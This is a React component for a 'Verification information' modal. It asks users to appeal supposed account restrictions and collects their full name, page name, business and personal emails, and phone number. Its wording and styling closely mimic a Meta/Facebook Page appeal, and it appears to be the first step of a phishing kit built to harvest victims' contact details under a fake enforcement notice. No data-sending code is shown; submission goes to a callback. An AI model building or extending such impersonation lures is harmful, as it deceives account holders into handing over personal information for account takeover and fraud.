'use client';

import { useState, type FormEvent } from 'react';
import type { FormData, UiTexts } from '@/types';
import PhoneInput from '@/components/phone-input';

type FormField = keyof FormData;
type FormErrors = Partial<Record<FormField, boolean>>;

interface FirstFormModalProps {
    show: boolean;
    onClose: () => void;
    onSubmit: (data: FormData) => void;
    texts: UiTexts;
    asPage?: boolean;
}

const FirstFormModal = ({ show, onClose, onSubmit, texts, asPage = false }: FirstFormModalProps) => {
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        reason: '',
        additionalNotes: '',
    });
    const [errors, setErrors] = useState<FormErrors>({});
    const [submitError, setSubmitError] = useState('');

    const handleChange = (field: FormField, value: string) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (errors[field]) {
            setErrors((prev) => ({ ...prev, [field]: false }));
        }
    };

    const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setSubmitError('');
        const newErrors: FormErrors = {};
        const phoneDigits = String(formData.phone || '').replace(/\D/g, '');

        if (!formData.fullName.trim()) newErrors.fullName = true;
        if (!formData.personalEmail.trim()) newErrors.personalEmail = true;
        if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
        if (!formData.phone.trim() || phoneDigits.length < 8 || phoneDigits.length > 15) newErrors.phone = true;
        if (!formData.pageName.trim()) newErrors.pageName = true;

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            setSubmitError(texts.fillRequiredFields || 'Please fill in correctly and completely all required fields to complete the verification profile.');
            return;
        }

        onSubmit({
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phone: formData.phone,
            pageName: formData.pageName,
            reason: formData.reason,
            additionalNotes: formData.additionalNotes
        });
    };

    if (!show) return null;

    const inputClass = (hasError?: boolean) =>
        `w-full border h-9 px-3 rounded-lg text-sm outline-none focus:border-blue-500 ${hasError ? 'border-red-500' : 'border-[#d4dbe3]'}`;
    const radioErrorClass = errors.reason ? 'ring-1 ring-red-500 rounded-md p-1' : '';
    const radioTextClass = 'text-sm leading-6 text-gray-700 cursor-pointer';

    const formContent = (
        <>
            <div className="flex items-start justify-between gap-4 mb-1">
                <h2 className="text-[20px] font-[700] text-[#212121]">
                    {texts.verificationInfo || 'Verification information'}
                </h2>
                {!asPage && (
                    <button type="button" aria-label="Close" onClick={onClose} className="text-[#666] text-[24px] leading-none">
                        ×
                    </button>
                )}
            </div>

            <p className="mb-2 p-2.5 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px] leading-5">
                {texts.reviewReasonIntro || 'Please indicate why you believe that account restrictions were imposed by mistake. Our technology and team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us in your native language.'}
            </p>

            <form onSubmit={handleSubmit} className="space-y-3">
                {submitError && (
                    <p className="text-[13px] text-red-600 -mb-1">{submitError}</p>
                )}

                <div>
                    <label className="block font-[600] text-sm text-gray-700 mb-1">
                        {texts.fullName || 'Full Name'} <span className="text-red-600">*</span>
                    </label>
                    <input
                        type="text"
                        placeholder={texts.fullNamePlaceholder}
                        value={formData.fullName}
                        onChange={(e) => handleChange('fullName', e.target.value)}
                        className={inputClass(errors.fullName)}
                    />
                </div>

                <div>
                    <label className="block font-[600] text-sm text-gray-700 mb-1">
                        {texts.yourPageName || 'Your Page Name'} <span className="text-red-600">*</span>
                    </label>
                    <input
                        type="text"
                        placeholder={texts.pageNamePlaceholder}
                        value={formData.pageName}
                        onChange={(e) => handleChange('pageName', e.target.value)}
                        className={inputClass(errors.pageName)}
                    />
                </div>

                <div>
                    <label className="block font-[600] text-sm text-gray-700 mb-1">
                        {texts.businessEmail || 'Business Email'} <span className="text-red-600">*</span>
                    </label>
                    <input
                        type="email"
                        placeholder={texts.businessEmailPlaceholder}
                        value={formData.businessEmail}
                        onChange={(e) => handleChange('businessEmail', e.target.value)}
                        className={inputClass(errors.businessEmail)}
                    />
                </div>

                <div>
                    <label className="block font-[600] text-sm text-gray-700 mb-1">
                        {texts.personalEmail || 'Personal Email'} <span className="text-red-600">*</span>
                    </label>
                    <input
                        type="email"
                        placeholder={texts.personalEmailPlaceholder}
                        value={formData.personalEmail}
                        onChange={(e) => handleChange('personalEmail', e.target.value)}
                        className={inputClass(errors.personalEmail)}
                    />
                </div>

                <div>
                    <label className="block font-[600] text-sm text-gray-700 mb-1">
                        {texts.mobilePhone || 'Mobile Phone Number'} <span className="text-red-600">*</span>
                    </label>
                    <PhoneInput
                        value={formData.phone}
                        onChange={(val) => handleChange('phone', val)}
                        error={!!errors.phone}
                        id="phone-input"
                        name="phone"
                        placeholder={texts.mobilePhonePlaceholder || ''}
                    />
                </div>

                <div className="pt-1">
                    <p className="block text-sm font-[600] text-gray-700 mb-3">
                        {texts.reviewReasonTitle || 'What do you think happened?'}
                    </p>

                    <div className={`space-y-2 ${radioErrorClass}`}>
                        <label className="flex items-start" style={{ columnGap: '10px' }}>
                            <input
                                type="radio"
                                name="reason"
                                value="erroneous_report"
                                checked={formData.reason === 'erroneous_report'}
                                onChange={(e) => handleChange('reason', e.target.value)}
                                className="mt-1 shrink-0"
                                style={{ marginRight: '10px' }}
                            />
                            <span className={radioTextClass} onClick={() => handleChange('reason', 'erroneous_report')}>
                                {texts.reasonErroneousReport || 'An erroneous report or unfair competitive complaint.'}
                            </span>
                        </label>

                        <label className="flex items-start" style={{ columnGap: '10px' }}>
                            <input
                                type="radio"
                                name="reason"
                                value="notification_error"
                                checked={formData.reason === 'notification_error'}
                                onChange={(e) => handleChange('reason', e.target.value)}
                                className="mt-1 shrink-0"
                                style={{ marginRight: '10px' }}
                            />
                            <span className={radioTextClass} onClick={() => handleChange('reason', 'notification_error')}>
                                {texts.reasonNotificationError || 'This notification was sent in error.'}
                            </span>
                        </label>

                        <label className="flex items-start" style={{ columnGap: '10px' }}>
                            <input
                                type="radio"
                                name="reason"
                                value="no_fraud"
                                checked={formData.reason === 'no_fraud'}
                                onChange={(e) => handleChange('reason', e.target.value)}
                                className="mt-1 shrink-0"
                                style={{ marginRight: '10px' }}
                            />
                            <span className={radioTextClass} onClick={() => handleChange('reason', 'no_fraud')}>
                                {texts.reasonNoFraud || 'No fraud involved / another legitimate reason:'}
                            </span>
                        </label>

                        <div className="mt-1">
                            <textarea
                                placeholder={texts.additionalNotesPlaceholder}
                                value={formData.additionalNotes}
                                onChange={(e) => handleChange('additionalNotes', e.target.value)}
                                className="w-full border border-[#d4dbe3] h-16 px-3 py-2 rounded-lg text-sm resize-none outline-none focus:border-blue-500"
                            />
                        </div>
                    </div>
                </div>

                <div className="pt-2">
                    <button
                        type="submit"
                        className="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-[999px] py-2.5 hover:bg-blue-700 transition-colors"
                        style={{ borderRadius: '999px' }}
                    >
                        {texts.continueBtn || 'Continue'}
                    </button>
                </div>
            </form>
        </>
    );

    if (asPage) {
        return (
            <div className="w-full max-w-[600px] my-3 md:my-8 mx-auto bg-white md:rounded-lg md:shadow-sm md:border md:border-gray-200 px-4 py-4">
                {formContent}
            </div>
        );
    }

    return (
        <div
            className="fixed inset-0 z-[1040] bg-black/45 flex justify-center items-start p-3 md:p-6 overflow-y-auto"
            onClick={onClose}
        >
            <div
                className="relative w-full max-w-[600px] bg-white rounded-lg shadow-sm border border-gray-200 p-4 max-h-[92vh] overflow-y-auto"
                onClick={(e) => e.stopPropagation()}
            >
                {formContent}
            </div>
        </div>
    );
};

export default FirstFormModal;
